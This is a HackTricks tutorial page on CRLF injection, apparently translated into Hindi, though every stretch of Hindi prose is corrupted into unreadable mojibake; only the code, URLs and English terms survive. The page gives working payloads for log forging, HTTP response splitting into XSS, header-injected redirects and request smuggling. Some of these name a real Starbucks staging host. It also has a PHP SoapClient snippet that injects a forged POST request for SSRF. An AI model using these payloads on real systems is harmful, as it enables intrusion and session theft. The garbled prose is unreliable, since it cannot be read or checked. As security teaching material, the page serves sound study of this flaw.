# CRLF (%0D%0A) рдЗрдВрдЬреЗрдХреНрд╢рди

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╣рдорд╛рд░реЗ рд╕рд╛рде рдЬреБрдбрд╝реЗрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рдЧреНрд░реБрдк**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рдЧреНрд░реБрдк**](https://t.me/peass) рдФрд░ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live) рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рдФрд░ **HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>

<figure><img src="../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдЯрд┐рдк**: **Intigriti** рдХреЗ рд▓рд┐рдП **рд╕рд╛рдЗрди рдЕрдк рдХрд░реЗрдВ**, рдПрдХ рдкреНрд░реАрдорд┐рдпрдо **рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рдЬреЛ рд╣реИрдХрд░реНрд╕ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдИ рдЧрдИ рд╣реИ**! рдЖрдЬ рд╣рдорд╛рд░реЗ рд╕рд╛рде рдЬреБрдбрд╝реЗрдВ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) рдФрд░ рд╢реБрд░реВ рдХрд░реЗрдВ рдмрд╛рдЙрдВрдЯреА рдЕрдк рдЯреВ **$100,000** рддрдХ рдХрдорд╛рдирд╛!

{% embed url="https://go.intigriti.com/hacktricks" %}

### CRLF

рдХреИрд░рд┐рдЬ рд░рд┐рдЯрд░реНрди (CR) рдФрд░ рд▓рд╛рдЗрди рдлреАрдб (LF), рд╕рдореВрд╣рд┐рдХ рд░реВрдк рд╕реЗ CRLF рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдиреЗ рдЬрд╛рддреЗ рд╣реИрдВ, рдпреЗ рд╡рд┐рд╢реЗрд╖ рд╡рд░реНрдг рд╕рд░реНрд╡рд░ рдФрд░ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рджреНрд╡рд╛рд░рд╛ HTTP рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдореЗрдВ рдПрдХ рдкрдВрдХреНрддрд┐ рдХреЗ рдЕрдВрдд рдпрд╛ рдирдИ рдкрдВрдХреНрддрд┐ рдХреА рд╢реБрд░реБрдЖрдд рдХреЛ рджрд░реНрд╢рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред рдпреЗ рд╡рд░реНрдг рд╕рд╛рдорд╛рдиреНрдпрдд: рд╡рд┐рднрд┐рдиреНрди рд╡реЗрдм рд╕рд░реНрд╡рд░ рдкреНрд░рдХрд╛рд░реЛрдВ, рдЬреИрд╕реЗ Apache рдФрд░ Microsoft IIS, рдореЗрдВ HTTP/1.1 рд╕рдВрдЪрд╛рд░ рдореЗрдВ рд╡реНрдпрд╛рдкрдХ рд░реВрдк рд╕реЗ рдкреНрд░рдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред

### CRLF рдЗрдВрдЬреЗрдХреНрд╢рди рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖

CRLF рдЗрдВрдЬреЗрдХреНрд╢рди рдореЗрдВ CR рдФрд░ LF рд╡рд░реНрдгреЛрдВ рдХреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП рдЗрдирдкреБрдЯ рдореЗрдВ рдбрд╛рд▓рд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдХрд╛рд░реНрд░рд╡рд╛рдИ рд╕рд░реНрд╡рд░, рдПрдкреНрд▓рд┐рдХреЗрд╢рди, рдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдзреЛрдЦрд╛ рджреЗрддреА рд╣реИ рдХрд┐ рдбрд╛рд▓реЗ рдЧрдП рд╕рд░рдгреА рдХреЛ рдПрдХ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗ рдЕрдВрдд рдФрд░ рдПрдХ рдирдИ рдкреНрд░рд╛рд░рдВрдн рдХреЗ рд░реВрдк рдореЗрдВ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХрд┐рдпрд╛ рдЬрд╛рдПред рдпреЗ рд╡рд░реНрдг рд╕реНрд╡рд╛рднрд╛рд╡рд┐рдХ рд░реВрдк рд╕реЗ рд╣рд╛рдирд┐рдХрд╛рд░рдХ рдирд╣реАрдВ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдЙрдирдХреЗ рджреБрд░реБрдкрдпреЛрдЧ рд╕реЗ HTTP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╡рд┐рднрд╛рдЬрди рдФрд░ рдЕрдиреНрдп рджреБрд░рд╛рдЪрд╛рд░ рдХрд╛рд░реНрд░рд╡рд╛рдИ рд╣реЛ рд╕рдХрддреА рд╣реИред

### рдЙрджрд╛рд╣рд░рдг: рдПрдХ рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ CRLF рдЗрдВрдЬреЗрдХреНрд╢рди

[рдпрд╣рд╛рдВ рд╕реЗ рдЙрджрд╛рд╣рд░рдг](https://www.invicti.com/blog/web-security/crlf-http-header/) рджреЗрдЦреЗрдВ

рдПрдХ рдПрдбрдорд┐рди рдкреИрдирд▓ рдореЗрдВ рдПрдХ рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдзреНрдпрд╛рди рдореЗрдВ рд░рдЦреЗрдВ рдЬреЛ рдлреЙрд░реНрдореЗрдЯ рдореЗрдВ рд╣реИ: `IP - рд╕рдордп - рджрд░реНрд╢рд┐рдд рдкрде`ред рдПрдХ рд╕рд╛рдзрд╛рд░рдг рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рд╣реЛ рд╕рдХрддреА рд╣реИ:
```
123.123.123.123 - 08:15 - /index.php?page=home
```
рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕ рд▓реЙрдЧ рдХреЛ рдорд╛рдирд┐рдкреБрд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП CRLF рдЕрдВрд╢рдзрд╛рд░рдг рдХрд╛ рд╢реЛрд╖рдг рдХрд░ рд╕рдХрддрд╛ рд╣реИред HTTP рдЕрдиреБрд░реЛрдз рдореЗрдВ CRLF рд╡рд░реНрдгреЛрдВ рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдХреЗ, рд╣рдорд▓рд╛рд╡рд░ рдЖрдЙрдЯрдкреБрдЯ рд╕реНрдЯреНрд░реАрдо рдХреЛ рдмрджрд▓ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рд▓реЙрдЧ рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐рдпреЛрдВ рдХреЛ рдирдХрд▓реА рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХ рдЗрдВрдЬреЗрдХреНрдЯреЗрдб рдЕрдиреБрдХреНрд░рдо рд▓реЙрдЧ рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдХреЛ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдмрджрд▓ рд╕рдХрддрд╛ рд╣реИ:
```
/index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
рдпрд╣рд╛рдБ, `%0d` рдФрд░ `%0a` CR рдФрд░ LF рдХреЗ URL-encoded рд░реВрдк рдХреЛ рдкреНрд░рддрд┐рдирд┐рдзрд┐рдд рдХрд░рддреЗ рд╣реИрдВред рд╣рдорд▓реЗ рдХреЗ рдмрд╛рдж, рд▓реЙрдЧ рдЧреБрдорд░рд╛рд╣ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд░реВрдк рдореЗрдВ рдкреНрд░рджрд░реНрд╢рд┐рдд рд╣реЛрдЧрд╛:
```
IP - Time - Visited Path

123.123.123.123 - 08:15 - /index.php?page=home&
127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
рдЕрдЯреИрдХрд░ рдЗрд╕ рддрд░рд╣ рдЕрдкрдиреА рджреБрд░рд╛рдЪрд╛рд░реА рдЧрддрд┐рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЛ рдЫреБрдкрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ localhost (рд╕рд░реНрд╡рд░ рдкрд░рд┐рд╡реЗрд╢ рдореЗрдВ рд╕рд╛рдорд╛рдиреНрдпрдд: рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдПрдХрд╛рдВрдд) рдиреЗ рдХреНрд░рд┐рдпрд╛рдПрдБ рдХреА рд╣реИрдВред рд╕рд░реНрд╡рд░ `%0d%0a` рд╕реЗ рд╢реБрд░реВ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдХреНрд╡реЗрд░реА рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рдХреЛ рдПрдХ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд░реВрдк рдореЗрдВ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХрд░рддрд╛ рд╣реИ, рдЬрдмрдХрд┐ `restrictedaction` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдЕрд▓рдЧ, рдЕрд▓рдЧ рдЗрдирдкреБрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдорд╛рдирд┐рдкреБрд░рд┐рдд рдХреНрд╡реЗрд░реА рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд░реВрдк рд╕реЗ рдПрдХ рд╡рд┐рдзрд╛рдпрдХ рдкреНрд░рд╢рд╛рд╕рдирд┐рдХ рдХрдорд╛рдВрдб рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рддреА рд╣реИ: `/index.php?page=home&restrictedaction=edit`

### HTTP Response Splitting

#### рд╡рд┐рд╡рд░рдг

HTTP Response Splitting рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рджреБрд░реБрдкрдпреЛрдЧ рд╣реИ рдЬреЛ рдЙрддреНрддрд░реЛрдВ рдХреА рд╕рдВрд░рдЪрдирд╛ рдХрд╛ рд╢реЛрдз рдХрд░рддрд╛ рд╣реИ рдЬрдм рдПрдХ рдЕрдЯреИрдХрд░ HTTP рдЙрддреНрддрд░реЛрдВ рдХреА рд╕рдВрд░рдЪрдирд╛ рдХрд╛ рд╢реЛрдз рдХрд░рддрд╛ рд╣реИред рдпрд╣ рд╕рдВрд░рдЪрдирд╛ рд╢реАрд░реНрд╖рдХреЛрдВ рдХреЛ рд╢рд░реАрд░ рд╕реЗ рдПрдХ рд╡рд┐рд╢реЗрд╖ рд╡рд░реНрдг рд╕рд┐рд░рдЬрдирд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрд▓рдЧ рдХрд░рддреА рд╣реИ, рдХреИрд░рд┐рдЬ рд░рд┐рдЯрд░реНрди (CR) рдХреЗ рдмрд╛рдж рд▓рд╛рдЗрди рдлреАрдб (LF), рд╕рдореВрд╣рд┐рдд рд░реВрдк рд╕реЗ CRLF рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд┐рд╕реЗ рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред рдЕрдЧрд░ рдПрдХ рдЕрдЯреИрдХрд░ рдХрд┐рд╕реА рдЙрддреНрддрд░ рд╣реЗрдбрд░ рдореЗрдВ рдПрдХ CRLF рд╕рд┐рд░рдЬрдирд╛ рдбрд╛рд▓рдиреЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рд╡рд╣ рдкреНрд░рднрд╛рд╡реА рд░реВрдк рд╕реЗ рдЙрддреНрддрд░ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдорд╛рдирд┐рдкреБрд░рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреА рдорд╛рдирд┐рдкреБрд░рдг рд╕реБрд░рдХреНрд╖рд╛ рд╕рдорд╕реНрдпрд╛рдУрдВ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдХреНрд░реЙрд╕-рд╕рд╛рдЗрдЯ рд╕реНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ (XSS) рдХреА рдУрд░ рд▓реЗ рдЬрд╛ рд╕рдХрддреА рд╣реИред

#### HTTP Response Splitting рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ XSS

1. рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХрд╛ рдПрдХ рдХрд╕реНрдЯрдо рд╣реЗрдбрд░ рд╕реЗрдЯ рдХрд░рддрд╛ рд╣реИ: `X-Custom-Header: UserInput`
2. рдПрдкреНрд▓рд┐рдХреЗрд╢рди "user\_input" рдЬреИрд╕реЗ рдХреНрд╡реЗрд░реА рдкреИрд░рд╛рдореАрдЯрд░ рд╕реЗ `UserInput` рдХреЗ рд▓рд┐рдП рдорд╛рди рд▓рд╛рддрд╛ рд╣реИред рдЙрдЪрд┐рдд рдЗрдирдкреБрдЯ рдорд╛рдиреНрдпрддрд╛ рдФрд░ рдЗрдирдХреЛрдбрд┐рдВрдЧ рдХреА рдХрдореА рд╡рд╛рд▓реЗ рдкрд░рд┐рджреГрд╢реНрдпреЛрдВ рдореЗрдВ, рдПрдХ рдЕрдЯреИрдХрд░ рдПрдХ рдкреЗрд▓реЛрдб рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ CRLF рд╕рд┐рд░рдЬрдирд╛, рдФрд░ рдлрд┐рд░ рдХрдЯреНрдЯрд░ рд╕рд╛рдордЧреНрд░реА рд╢рд╛рдорд┐рд▓ рд╣реЛрддреА рд╣реИред
3. рдПрдХ рдЕрдЯреИрдХрд░ рдПрдХ URL рдмрдирд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдмрдирд╛рдпрд╛ рдЧрдпрд╛ 'user\_input' рд╣реЛрддрд╛ рд╣реИ: `?user_input=Value%0d%0a%0d%0a<script>alert('XSS')</script>`
* рдЗрд╕ URL рдореЗрдВ, `%0d%0a%0d%0a` CRLFCRLF рдХрд╛ URL-рдХреЛрдбрд┐рдд рд░реВрдк рд╣реИред рдпрд╣ рд╕рд░реНрд╡рд░ рдХреЛ CRLF рд╕рд┐рд░рдЬрдирд╛ рдбрд╛рд▓рдиреЗ рдореЗрдВ рдзреЛрдЦрд╛ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕рд░реНрд╡рд░ рдЙрддреНрддрд░ рд╢рд░реАрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдЪрд╛рд░ рдХрд░рдиреЗ рд▓рдЧрддрд╛ рд╣реИред
4. рд╕рд░реНрд╡рд░ рдЙрддреНрддрд░ рд╣реЗрдбрд░ рдореЗрдВ рдЕрдЯреИрдХрд░ рдХрд╛ рдЗрдирдкреБрдЯ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдПрдХ рдЕрдирдЪрд╛рд╣реЗ рдЙрддреНрддрд░ рд╕рдВрд░рдЪрдирд╛ рдореЗрдВ рд▓реЗ рдЬрд╛рддрд╛ рд╣реИ рдЬрд╣рд╛рдВ рджреБрд░рд╛рдЪрд╛рд░реА рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рджреНрд╡рд╛рд░рд╛ рдЙрддреНрддрд░ рд╢рд░реАрд░ рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред

#### HTTP Response Splitting рд╕реЗ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рддрдХ рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдПрдХ рдЙрджрд╛рд╣рд░рдг

[https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62](https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62)

рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ:
```
/%0d%0aLocation:%20http://myweb.com
```
рдФрд░ рд╕рд░реНрд╡рд░ рд╣реЗрдбрд░ рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреЗрддрд╛ рд╣реИ:
```
Location: http://myweb.com
```
**рдЕрдиреНрдп рдЙрджрд╛рд╣рд░рдг: (рд╕реЗ** [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)**)**
```
http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
```
#### URL рдкрде рдореЗрдВ

рдЖрдк **URL рдкрде рдХреЗ рдЕрдВрджрд░** рдкреЗрд▓реЛрдб рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╕рд░реНрд╡рд░ рд╕реЗ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ (рдЙрджрд╛рд╣рд░рдг [рдпрд╣рд╛рдБ рд╕реЗ](https://hackerone.com/reports/192667)):
```
http://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
http://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
```
рдЕрдзрд┐рдХ рдЙрджрд╛рд╣рд░рдг рджреЗрдЦреЗрдВ:

{% embed url="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md" %}

### HTTP рд╣реЗрдбрд░ рдЗрдВрдЬреЗрдХреНрд╢рди

HTTP рд╣реЗрдбрд░ рдЗрдВрдЬреЗрдХреНрд╢рди, рдЕрдХреНрд╕рд░ CRLF (рдХреИрд░рд┐рдЬ рд░рд┐рдЯрд░реНрди рдФрд░ рд▓рд╛рдЗрди рдлреАрдб) рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЙрддреНрдкреАрдбрд╝рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╣рдорд▓рд╛рд╡рджрд╛рддрд╛рдУрдВ рдХреЛ HTTP рд╣реЗрдбрд░реНрд╕ рдбрд╛рд▓рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдпрд╣ XSS (рдХреНрд░реЙрд╕-рд╕рд╛рдЗрдЯ рд╕реНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ) рдлрд╝рд┐рд▓реНрдЯрд░ рдпрд╛ SOP (рд╕реЗрдо-рдУрд░рд┐рдЬрд┐рди рдкреЙрд▓рд┐рд╕реА) рдЬреИрд╕реА рд╕реБрд░рдХреНрд╖рд╛ рддрдВрддреНрд░реЛрдВ рдХреЛ рдХрдордЬреЛрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЕрдирдзрд┐рдХреГрдд рд░реВрдк рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреИрд╕реЗ CSRF рдЯреЛрдХрди, рдпрд╛ рдХреБрдХреА рдкреНрд▓рд╛рдВрдЯрд┐рдВрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рддреНрд░реЛрдВ рдХрд╛ рдЙрд▓реНрд▓рдВрдШрдиред

#### HTTP рд╣реЗрдбрд░ рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ CORS рдХрд╛ рд╢реЛрдзрди

рд╣рдорд▓рд╛рд╡рджрд╛рддрд╛ CORS (рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рд░рд┐рд╕реЛрд░реНрд╕ рд╢реЗрдпрд░рд┐рдВрдЧ) рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП HTTP рд╣реЗрдбрд░реНрд╕ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, SOP рджреНрд╡рд╛рд░рд╛ рд▓рдЧрд╛рдП рдЧрдП рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЛ рдЫрд▓рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдпрд╣ рдЙрд▓реНрд▓рдВрдШрди рджреБрд░реБрдкрдпреЛрдЧреА рдореВрд▓реЛрдВ рд╕реЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕ рдХреЛ рдЕрдиреНрдп рдореВрд▓ рд╕реЗ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдВрд░рдХреНрд╖рд┐рдд рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИред

#### CRLF рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ SSRF рдФрд░ HTTP рдЕрдиреБрд░реЛрдз рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд╛ рд╢реЛрдзрди

CRLF рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреВрд░реА рддрд░рд╣ рдирдпрд╛ HTTP рдЕрдиреБрд░реЛрдз рдмрдирд╛рдиреЗ рдФрд░ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдореЗрдВ PHP рдХреА `SoapClient` рдХрдХреНрд╖рд╛ рдореЗрдВ рджреЛрд╖ рдХрд╛ рдПрдХ рдкреНрд░рдореБрдЦ рдЙрджрд╛рд╣рд░рдг рд╣реИ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ `user_agent` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рднреАрддрд░ред рдЗрд╕ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдордирд┐рдкреБрд▓реЗрдЯ рдХрд░рдХреЗ, рдПрдХ рд╣рдорд▓рд╛рд╡рджрд╛рддрд╛ рдЕрддрд┐рд░рд┐рдХреНрдд рд╣реЗрдбрд░реНрд╕ рдФрд░ рдмреЙрдбреА рд╕рд╛рдордЧреНрд░реА рдбрд╛рд▓ рд╕рдХрддрд╛ рд╣реИ, рдпрд╛ рдирдП HTTP рдЕрдиреБрд░реЛрдз рдХреЛ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдиреАрдЪреЗ рдПрдХ PHP рдЙрджрд╛рд╣рд░рдг рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬреЛ рдЗрд╕ рд╢реЛрдзрди рдХреЛ рджрд┐рдЦрд╛рддрд╛ рд╣реИ:
```php
$target = 'http://127.0.0.1:9090/test';
$post_string = 'variable=post value';
$crlf = array(
'POST /proxy HTTP/1.1',
'Host: local.host.htb',
'Cookie: PHPSESSID=[PHPSESSID]',
'Content-Type: application/x-www-form-urlencoded',
'Content-Length: '.(string)strlen($post_string),
"\r\n",
$post_string
);

$client = new SoapClient(null,
array(
'uri'=>$target,
'location'=>$target,
'user_agent'=>"IGN\r\n\r\n".join("\r\n",$crlf)
)
);

# Put a netcat listener on port 9090
$client->__soapCall("test", []);
```
### рд╣реЗрдбрд░ рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд░рдХреЗ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рд╕реНрдордЧреНрд▓рд┐рдВрдЧ

рдЗрд╕ рддрдХрдиреАрдХ рдФрд░ рд╕рдВрднрд╛рд╡рд┐рдд рд╕рдорд╕реНрдпрд╛рдУрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**рдореВрд▓ рд╕реНрд░реЛрдд рджреЗрдЦреЗрдВ**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning).

рдЖрдк рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реЗрдбрд░реНрд╕ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ **рдмреИрдХ-рдПрдВрдб рдХрдиреЗрдХреНрд╢рди рдУрдкрди рд░рдЦреЗ** рдкрд╣рд▓реЗ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдХрд╛ рдЬрд╡рд╛рдм рджреЗрдиреЗ рдХреЗ рдмрд╛рдж:
```
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1
```
